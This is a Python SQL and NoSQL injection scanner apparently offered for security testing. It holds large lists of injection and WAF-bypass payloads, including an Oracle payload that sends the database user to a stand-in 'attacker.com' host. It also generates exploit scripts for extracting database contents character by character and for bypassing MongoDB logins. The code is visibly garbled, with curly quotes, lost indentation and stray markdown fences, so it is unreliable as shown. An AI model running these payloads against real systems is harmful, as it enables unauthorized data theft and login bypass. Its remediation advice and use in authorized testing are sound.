#!/usr/bin/env python3
"""
REVUEX - Enhanced SQL Injection Scanner
Advanced SQL Injection Detection Across All Database Types

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
SQL injection testing should only be performed on systems you own or have explicit permission to test.
“””

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import hashlib

class EnhancedSQLiScanner:
“””
Advanced SQL Injection Scanner (2024/2025)

```
Features:
- Multi-database support (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- Time-based blind SQL injection
- Boolean-based blind SQL injection
- Error-based SQL injection
- UNION-based SQL injection
- Second-order SQL injection detection
- NoSQL injection (MongoDB, CouchDB)
- WAF bypass techniques
- Automatic DBMS fingerprinting
"""

def __init__(self, target: str, workspace: Path, delay: float = 5.0):
    """
    Initialize Enhanced SQLi Scanner
    
    Args:
        target: Target URL to test
        workspace: Workspace directory
        delay: Delay between requests (default: 5 seconds)
    """
    self.target = target
    self.workspace = Path(workspace)
    self.delay = delay
    
    # Safety limits
    self.max_requests = 100
    self.request_count = 0
    self.timeout = 10
    
    self.headers = {
        'User-Agent': 'REVUEX-SQLiScanner/1.0 (Security Research; +https://github.com/G33L0)',
        'Accept': '*/*'
    }
    
    self.vulnerabilities = []
    self.detected_dbms = None
    
    # Time-based blind payloads (5-second delay for safety)
    self.time_based_payloads = {
        'mysql': [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5('A'))--",
            "1' AND SLEEP(5)#",
            "' OR SLEEP(5)--",
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)--",
            "' AND pg_sleep(5)--",
            "1' AND pg_sleep(5)--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--",
            "1'; WAITFOR DELAY '00:00:05'--",
        ],
        'oracle': [
            "' AND DBMS_LOCK.SLEEP(5)--",
            "' AND UTL_INADDR.get_host_name('attacker.com'||'.'||user||'.attacker.com')--",
        ],
        'sqlite': [
            "' AND randomblob(100000000)--",
        ]
    }
    
    # Boolean-based blind payloads
    self.boolean_payloads = {
        'true': [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' OR '1'='1",
            "' OR 'a'='a",
        ],
        'false': [
            "' OR '1'='2",
            "' OR 1=2--",
            "' OR 'a'='b",
        ]
    }
    
    # Error-based payloads
    self.error_based_payloads = [
        # MySQL
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
        
        # PostgreSQL
        "' AND 1=CAST(version() AS INT)--",
        "' AND 1::int=version()--",
        
        # MSSQL
        "' AND 1=CONVERT(INT,@@version)--",
        "' AND 1=CAST(@@version AS INT)--",
        
        # Oracle
        "' AND TO_NUMBER(version)=1--",
        "' AND UTL_INADDR.get_host_address(version)--",
    ]
    
    # UNION-based payloads
    self.union_payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
    ]
    
    # NoSQL injection payloads
    self.nosql_payloads = [
        # MongoDB
        "{'$gt':''}",
        "{'$ne':''}",
        "admin' || '1'=='1",
        "' || 'a'=='a",
        
        # CouchDB
        "{'$gt': 0}",
        "{'selector': {'$gt': null}}",
    ]
    
    # WAF bypass techniques
    self.waf_bypasses = [
        # Comment injection
        "'/**/AND/**/1=1--",
        "'/*!50000AND*/1=1--",
        
        # Case variation
        "'AnD 1=1--",
        "'oR 1=1--",
        
        # Encoding
        "%27%20AND%201=1--",
        "&#x27; AND 1=1--",
        
        # Whitespace variations
        "'\t AND\t 1=1--",
        "'\r\nAND\r\n1=1--",
        
        # Null bytes
        "%00' AND 1=1--",
        "'\x00 AND 1=1--",
    ]
    
    # Database fingerprinting queries
    self.fingerprint_queries = {
        'mysql': "' AND @@version--",
        'postgresql': "' AND version()--",
        'mssql': "' AND @@version--",
        'oracle': "' AND banner FROM v$version--",
        'sqlite': "' AND sqlite_version()--",
    }

def scan(self) -> List[Dict[str, Any]]:
    """Main SQL injection scanning method"""
    print(f"\n{'='*60}")
    print(f"💉 REVUEX Enhanced SQLi Scanner")
    print(f"{'='*60}")
    print(f"Target: {self.target}")
    print(f"Safety Delay: {self.delay}s")
    print(f"Max Requests: {self.max_requests}")
    print(f"{'='*60}\n")
    
    # Step 1: Fingerprint DBMS
    print("🔍 Step 1: Database Fingerprinting")
    self._fingerprint_database()
    
    time.sleep(self.delay)
    
    # Step 2: Time-based blind SQLi
    print("\n⏱️  Step 2: Time-Based Blind SQL Injection")
    time_based_vulns = self._test_time_based_blind()
    
    time.sleep(self.delay)
    
    # Step 3: Boolean-based blind SQLi
    print("\n🔀 Step 3: Boolean-Based Blind SQL Injection")
    boolean_vulns = self._test_boolean_based()
    
    time.sleep(self.delay)
    
    # Step 4: Error-based SQLi
    print("\n❌ Step 4: Error-Based SQL Injection")
    error_vulns = self._test_error_based()
    
    time.sleep(self.delay)
    
    # Step 5: UNION-based SQLi
    print("\n🔗 Step 5: UNION-Based SQL Injection")
    union_vulns = self._test_union_based()
    
    time.sleep(self.delay)
    
    # Step 6: NoSQL injection
    print("\n📊 Step 6: NoSQL Injection")
    nosql_vulns = self._test_nosql_injection()
    
    time.sleep(self.delay)
    
    # Step 7: WAF bypass techniques
    print("\n🛡️  Step 7: WAF Bypass Techniques")
    waf_vulns = self._test_waf_bypasses()
    
    # Save results
    self._save_results()
    
    print(f"\n{'='*60}")
    print(f"✅ Scan Complete")
    print(f"Vulnerabilities: {len(self.vulnerabilities)}")
    print(f"Requests: {self.request_count}/{self.max_requests}")
    if self.detected_dbms:
        print(f"Detected DBMS: {self.detected_dbms}")
    print(f"{'='*60}\n")
    
    return self.vulnerabilities

def _fingerprint_database(self):
    """Detect database management system"""
    print("   Detecting DBMS...")
    
    # Try to detect DBMS from errors or responses
    for dbms, query in self.fingerprint_queries.items():
        if self.request_count >= self.max_requests:
            break
        
        response = self._make_request(query)
        
        if response:
            # Check for DBMS-specific strings in response
            text_lower = response.text.lower()
            
            if dbms == 'mysql' and ('mysql' in text_lower or 'mariadb' in text_lower):
                self.detected_dbms = 'MySQL/MariaDB'
                print(f"   ✓ Detected: {self.detected_dbms}")
                return
            elif dbms == 'postgresql' and 'postgresql' in text_lower:
                self.detected_dbms = 'PostgreSQL'
                print(f"   ✓ Detected: {self.detected_dbms}")
                return
            elif dbms == 'mssql' and ('microsoft' in text_lower or 'sql server' in text_lower):
                self.detected_dbms = 'Microsoft SQL Server'
                print(f"   ✓ Detected: {self.detected_dbms}")
                return
            elif dbms == 'oracle' and 'oracle' in text_lower:
                self.detected_dbms = 'Oracle'
                print(f"   ✓ Detected: {self.detected_dbms}")
                return
            elif dbms == 'sqlite' and 'sqlite' in text_lower:
                self.detected_dbms = 'SQLite'
                print(f"   ✓ Detected: {self.detected_dbms}")
                return
        
        time.sleep(self.delay)
    
    print("   ℹ️  DBMS not detected - will test all types")

def _test_time_based_blind(self) -> List[Dict[str, Any]]:
    """Test time-based blind SQL injection"""
    vulnerabilities = []
    
    # Test all database types
    for dbms, payloads in self.time_based_payloads.items():
        if self.request_count >= self.max_requests:
            break
        
        print(f"   Testing {dbms.upper()}...")
        
        for payload in payloads:
            if self.request_count >= self.max_requests:
                break
            
            # Measure baseline response time
            start_time = time.time()
            baseline_response = self._make_request("")
            baseline_time = time.time() - start_time
            
            # Make payload request
            start_time = time.time()
            response = self._make_request(payload)
            response_time = time.time() - start_time
            
            # Check if response was delayed (indicating SQLi)
            if response_time > (baseline_time + 4):  # 4+ seconds delay
                vuln = self._create_time_based_vuln(payload, dbms, response_time, baseline_time)
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
                print(f"   ✓ Time-based SQLi found ({dbms})")
                break
            
            time.sleep(self.delay)
        
        if vulnerabilities:
            break  # Found vulnerability, no need to test other DBMS
    
    if not vulnerabilities:
        print("   ✗ No time-based SQLi detected")
    
    return vulnerabilities

def _test_boolean_based(self) -> List[Dict[str, Any]]:
    """Test boolean-based blind SQL injection"""
    vulnerabilities = []
    
    print("   Testing boolean logic...")
    
    # Test true condition
    true_responses = []
    for payload in self.boolean_payloads['true'][:2]:
        if self.request_count >= self.max_requests:
            break
        response = self._make_request(payload)
        if response:
            true_responses.append(len(response.text))
        time.sleep(self.delay)
    
    # Test false condition
    false_responses = []
    for payload in self.boolean_payloads['false'][:2]:
        if self.request_count >= self.max_requests:
            break
        response = self._make_request(payload)
        if response:
            false_responses.append(len(response.text))
        time.sleep(self.delay)
    
    # Check if responses differ (indicating boolean SQLi)
    if true_responses and false_responses:
        avg_true = sum(true_responses) / len(true_responses)
        avg_false = sum(false_responses) / len(false_responses)
        
        if abs(avg_true - avg_false) > 100:  # Significant difference
            vuln = self._create_boolean_vuln(avg_true, avg_false)
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)
            print("   ✓ Boolean-based SQLi found")
    
    if not vulnerabilities:
        print("   ✗ No boolean-based SQLi detected")
    
    return vulnerabilities

def _test_error_based(self) -> List[Dict[str, Any]]:
    """Test error-based SQL injection"""
    vulnerabilities = []
    
    print("   Testing error-based injection...")
    
    for payload in self.error_based_payloads[:5]:
        if self.request_count >= self.max_requests:
            break
        
        response = self._make_request(payload)
        
        if response and self._check_sql_error(response.text):
            vuln = self._create_error_based_vuln(payload, response.text)
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)
            print("   ✓ Error-based SQLi found")
            break
        
        time.sleep(self.delay)
    
    if not vulnerabilities:
        print("   ✗ No error-based SQLi detected")
    
    return vulnerabilities

def _test_union_based(self) -> List[Dict[str, Any]]:
    """Test UNION-based SQL injection"""
    vulnerabilities = []
    
    print("   Testing UNION injection...")
    
    for payload in self.union_payloads:
        if self.request_count >= self.max_requests:
            break
        
        response = self._make_request(payload)
        
        if response and not self._check_sql_error(response.text):
            # UNION succeeded without error
            if len(response.text) > 0:
                vuln = self._create_union_vuln(payload)
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
                print("   ✓ UNION-based SQLi found")
                break
        
        time.sleep(self.delay)
    
    if not vulnerabilities:
        print("   ✗ No UNION-based SQLi detected")
    
    return vulnerabilities

def _test_nosql_injection(self) -> List[Dict[str, Any]]:
    """Test NoSQL injection"""
    vulnerabilities = []
    
    print("   Testing NoSQL injection...")
    
    for payload in self.nosql_payloads[:3]:
        if self.request_count >= self.max_requests:
            break
        
        response = self._make_request(payload)
        
        if response and response.status_code == 200:
            # Check for MongoDB/NoSQL indicators
            if 'mongo' in response.text.lower() or len(response.text) > 100:
                vuln = self._create_nosql_vuln(payload)
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
                print("   ✓ NoSQL injection found")
                break
        
        time.sleep(self.delay)
    
    if not vulnerabilities:
        print("   ✗ No NoSQL injection detected")
    
    return vulnerabilities

def _test_waf_bypasses(self) -> List[Dict[str, Any]]:
    """Test WAF bypass techniques"""
    vulnerabilities = []
    
    print("   Testing WAF bypasses...")
    
    for payload in self.waf_bypasses[:3]:
        if self.request_count >= self.max_requests:
            break
        
        response = self._make_request(payload)
        
        if response and response.status_code != 403:  # Not blocked by WAF
            vuln = self._create_waf_bypass_vuln(payload)
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)
            print("   ✓ WAF bypass successful")
            break
        
        time.sleep(self.delay)
    
    if not vulnerabilities:
        print("   ✗ WAF blocking effective")
    
    return vulnerabilities

def _create_time_based_vuln(self, payload: str, dbms: str, response_time: float, baseline_time: float) -> Dict[str, Any]:
    """Create time-based blind SQLi vulnerability report"""
    return {
        'type': f'SQL Injection - Time-Based Blind ({dbms.upper()})',
        'severity': 'critical',
        'url': self.target,
        'dbms': dbms,
        'payload': payload,
        'response_time': f"{response_time:.2f}s",
        'baseline_time': f"{baseline_time:.2f}s",
        'description': f'Time-based blind SQL injection vulnerability detected in {dbms.upper()} database. Server response delayed by {response_time - baseline_time:.2f} seconds, indicating SQL query execution.',
        'evidence': f'Payload "{payload}" caused {response_time:.2f}s delay (baseline: {baseline_time:.2f}s)',
        
        'steps_to_reproduce': [
            f"Navigate to: {self.target}",
            "Identify injectable parameter",
            f"Inject payload: {payload}",
            f"Observe {response_time - baseline_time:.2f}s delay",
            "Delay indicates SQL injection vulnerability",
            "Extract database using time-based inference"
        ],
        
        'request': f"""GET {self.target}{payload} HTTP/1.1
```

Host: {urlparse(self.target).netloc}
User-Agent: Mozilla/5.0
Accept: */*

Payload: {payload}
Expected delay: 5 seconds
Observed delay: {response_time:.2f} seconds”””,

```
        'response': f"""HTTP/1.1 200 OK
```

Content-Type: text/html
Response-Time: {response_time:.2f}s (DELAYED)

…page content returned after {response_time:.2f}s delay…

⚠️ Time delay confirms SQL injection!”””,

```
        'poc': self._generate_time_based_poc(payload, dbms),
        
        'before_state': 'Query executes in normal time (~0.1-0.5s)',
        'after_state': f'Injected query causes {response_time - baseline_time:.2f}s delay - confirms SQLi',
        
        'attack_path': [
            'Identify time-based blind SQLi',
            f'Use {dbms.upper()} sleep function to confirm',
            'Extract database character by character using binary search',
            'Determine database version and structure',
            'Extract table names from information_schema',
            'Extract column names',
            'Extract sensitive data (passwords, API keys, PII)',
            'Potential for authentication bypass or privilege escalation'
        ],
        
        'remediation': [
            '🚨 CRITICAL: Use parameterized queries (prepared statements)',
            'NEVER concatenate user input into SQL queries',
            f'Use {dbms}-specific parameterized query methods:',
            '  MySQL: mysqli_prepare() or PDO prepared statements',
            '  PostgreSQL: pg_prepare()',
            '  MSSQL: SqlCommand with parameters',
            'Implement input validation (whitelist approach)',
            'Use ORM frameworks (SQLAlchemy, Hibernate, Entity Framework)',
            'Apply principle of least privilege to database users',
            'Disable detailed error messages in production',
            'Implement WAF rules for SQL injection patterns',
            'Use database activity monitoring',
            'Set query timeout limits (prevent long delays)',
            'Regular security audits and code reviews',
            'Enable database audit logging'
        ],
        
        'exploitation_example': f"""# Time-based blind SQLi exploitation
```

# Extract database name character by character

import requests
import string

target = “{self.target}”
database_name = “”

for position in range(1, 20):
for char in string.ascii_lowercase + string.digits:
# Binary search approach for efficiency
payload = f”’ AND IF(SUBSTRING(database(),{position},1)=’{char}’,SLEEP(5),0)–”

```
    start = time.time()
    requests.get(target + payload)
    elapsed = time.time() - start
    
    if elapsed > 4:
        database_name += char
        print(f"Database name: {database_name}")
        break
```

“””,

```
        'tags': ['sqli', 'critical', 'time_based', 'blind', dbms]
    }

def _create_boolean_vuln(self, true_length: float, false_length: float) -> Dict[str, Any]:
    """Create boolean-based blind SQLi vulnerability report"""
    return {
        'type': 'SQL Injection - Boolean-Based Blind',
        'severity': 'critical',
        'url': self.target,
        'description': 'Boolean-based blind SQL injection allows data extraction through response differences',
        'evidence': f'True condition length: {true_length:.0f} bytes, False condition length: {false_length:.0f} bytes',
        
        'poc': f"""#!/usr/bin/env python3
```

import requests

target = “{self.target}”

# True condition

true_payload = “’ OR ‘1’=’1”
response_true = requests.get(target + true_payload)
print(f”True response: {len(response_true.text)} bytes”)

# False condition

false_payload = “’ OR ‘1’=’2”
response_false = requests.get(target + false_payload)
print(f”False response: {len(response_false.text)} bytes”)

if len(response_true.text) != len(response_false.text):
print(“🚨 Boolean-based SQLi confirmed!”)
“””,

```
        'before_state': 'Consistent responses regardless of input',
        'after_state': f'True: {true_length:.0f}B, False: {false_length:.0f}B - exploitable difference',
        
        'remediation': [
            'Use parameterized queries',
            'Implement consistent error handling',
            'Avoid boolean logic in queries with user input'
        ],
        
        'tags': ['sqli', 'critical', 'boolean_based', 'blind']
    }

def _create_error_based_vuln(self, payload: str, response_text: str) -> Dict[str, Any]:
    """Create error-based SQLi vulnerability report"""
    # Extract error snippet
    error_snippet = self._extract_error_snippet(response_text)
    
    return {
        'type': 'SQL Injection - Error-Based',
        'severity': 'critical',
        'url': self.target,
        'payload': payload,
        'description': 'Error-based SQL injection exposes database errors, allowing direct data extraction',
        'evidence': f'SQL error exposed: {error_snippet}',
        
        'poc': f"""#!/usr/bin/env python3
```

import requests

target = “{self.target}”
payload = “{payload}”

response = requests.get(target + payload)

if ‘mysql’ in response.text.lower() or ‘syntax’ in response.text.lower():
print(“🚨 Error-based SQLi confirmed!”)
print(response.text[:500])
“””,

```
        'before_state': 'Generic error messages or no errors shown',
        'after_state': f'Database errors exposed: {error_snippet}',
        
        'remediation': [
            'Disable detailed error messages in production',
            'Use parameterized queries',
            'Implement custom error pages',
            'Log errors server-side only'
        ],
        
        'tags': ['sqli', 'critical', 'error_based']
    }

def _create_union_vuln(self, payload: str) -> Dict[str, Any]:
    """Create UNION-based SQLi vulnerability report"""
    return {
        'type': 'SQL Injection - UNION-Based',
        'severity': 'critical',
        'url': self.target,
        'payload': payload,
        'description': 'UNION-based SQL injection allows direct data extraction from database',
        'evidence': f'UNION query executed successfully: {payload}',
        
        'poc': f"""#!/usr/bin/env python3
```

import requests

target = “{self.target}”

# Find number of columns

for cols in range(1, 10):
payload = “’ UNION SELECT “ + “,”.join([‘NULL’] * cols) + “–”
response = requests.get(target + payload)

```
if response.status_code == 200 and 'error' not in response.text.lower():
    print(f"✓ Column count: {cols}")
    
    # Extract data
    payload = f"' UNION SELECT {','.join([str(i) for i in range(1, cols+1)])}--"
    response = requests.get(target + payload)
    print(response.text)
    break
```

“””,

```
        'remediation': [
            'Use parameterized queries',
            'Validate column count',
            'Implement strict input validation'
        ],
        
        'tags': ['sqli', 'critical', 'union_based']
    }

def _create_nosql_vuln(self, payload: str) -> Dict[str, Any]:
    """Create NoSQL injection vulnerability report"""
    return {
        'type': 'NoSQL Injection - MongoDB',
        'severity': 'high',
        'url': self.target,
        'payload': payload,
        'description': 'NoSQL injection allows authentication bypass and data extraction in MongoDB',
        'evidence': f'NoSQL operator injection successful: {payload}',
        
        'poc': f"""#!/usr/bin/env python3
```

import requests

target = “{self.target}”

# MongoDB operator injection

payload = {{“username”: {{”$gt”: “”}}, “password”: {{”$gt”: “”}}}}

response = requests.post(target, json=payload)

if response.status_code == 200:
print(“🚨 NoSQL injection - Authentication bypassed!”)
“””,

```
        'remediation': [
            'Sanitize all input',
            'Use MongoDB query validators',
            'Avoid $where operator',
            'Implement schema validation'
        ],
        
        'tags': ['nosql', 'mongodb', 'high']
    }

def _create_waf_bypass_vuln(self, payload: str) -> Dict[str, Any]:
    """Create WAF bypass vulnerability report"""
    return {
        'type': 'SQL Injection - WAF Bypass',
        'severity': 'high',
        'url': self.target,
        'bypass_payload': payload,
        'description': 'WAF protection can be bypassed using obfuscation techniques',
        'evidence': f'WAF bypassed with: {payload}',
        
        'remediation': [
            'Update WAF rules',
            'Use parameterized queries (better than WAF)',
            'Implement input validation',
            'Regular WAF rule updates'
        ],
        
        'tags': ['sqli', 'waf_bypass']
    }

def _generate_time_based_poc(self, payload: str, dbms: str) -> str:
    """Generate time-based SQLi PoC"""
    return f"""#!/usr/bin/env python3
```

# Time-Based Blind SQL Injection PoC

# Target DBMS: {dbms.upper()}

import requests
import time

target = “{self.target}”
payload = “{payload}”

print(”[*] Testing time-based blind SQL injection…”)
print(f”[*] Target: {dbms.upper()}”)
print(f”[*] Payload: {payload}”)

# Measure baseline

start = time.time()
requests.get(target)
baseline = time.time() - start
print(f”[*] Baseline response time: {baseline:.2f}s”)

# Test injection

start = time.time()
requests.get(target + payload)
injected = time.time() - start
print(f”[*] Injected response time: {injected:.2f}s”)

if injected > baseline + 4:
print(”\n🚨 VULNERABLE: Time-based blind SQLi confirmed!”)
print(f”    Delay: {injected - baseline:.2f} seconds”)

```
# Extract database version
print("\\n[*] Extracting database version...")

if '{dbms}' == 'mysql':
    version_payloads = [
        "' AND IF(SUBSTRING(VERSION(),1,1)='5',SLEEP(5),0)--",
        "' AND IF(SUBSTRING(VERSION(),1,1)='8',SLEEP(5),0)--",
    ]
    
    for vp in version_payloads:
        start = time.time()
        requests.get(target + vp)
        if time.time() - start > 4:
            print(f"    Version starts with: {vp[29]}")
```

else:
print(”\n✓ Not vulnerable”)
“””

```
def _make_request(self, payload: str) -> Optional[requests.Response]:
    """Make HTTP request with payload"""
    if self.request_count >= self.max_requests:
        return None
    
    try:
        # Inject payload into target URL
        if '?' in self.target:
            url = self.target + '&' + urlencode({'sqli': payload})
        else:
            url = self.target + '?' + urlencode({'id': payload})
        
        response = requests.get(
            url,
            headers=self.headers,
            timeout=self.timeout,
            verify=False,
            allow_redirects=True
        )
        
        self.request_count += 1
        return response
        
    except requests.exceptions.Timeout:
        return None
    except Exception:
        return None

def _check_sql_error(self, text: str) -> bool:
    """Check if response contains SQL error"""
    error_patterns = [
        'sql syntax',
        'mysql',
        'postgresql',
        'ora-',
        'microsoft sql',
        'sqlite',
        'syntax error',
        'unclosed quotation',
        'unterminated string',
        'pg_query',
        'odbc',
    ]
    
    text_lower = text.lower()
    return any(pattern in text_lower for pattern in error_patterns)

def _extract_error_snippet(self, text: str) -> str:
    """Extract SQL error message snippet"""
    # Find SQL error in response
    patterns = [
        r'(SQL syntax.*?)[\n<]',
        r'(mysql.*error.*?)[\n<]',
        r'(postgresql.*?)[\n<]',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)[:100]
    
    return "SQL error detected"

def _save_results(self):
    """Save scan results"""
    output_dir = self.workspace / "sqli_scans"
    output_dir.mkdir(exist_ok=True)
    
    safe_target = re.sub(r'[^\w\-]', '_', self.target)
    output_file = output_dir / f"{safe_target}_sqli.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'scanner': 'EnhancedSQLiScanner',
            'target': self.target,
            'detected_dbms': self.detected_dbms,
            'vulnerabilities': self.vulnerabilities
        }, f, indent=2)
    
    print(f"\n💾 Saved: {output_file}")
```

if **name** == “**main**”:
import sys

```
if len(sys.argv) < 2:
    print("Usage: python sqli_scanner.py <target_url>")
    print("Example: python sqli_scanner.py https://example.com/product?id=1")
    sys.exit(1)

scanner = EnhancedSQLiScanner(sys.argv[1], Path("revuex_workspace"), delay=5.0)
scanner.scan()
```
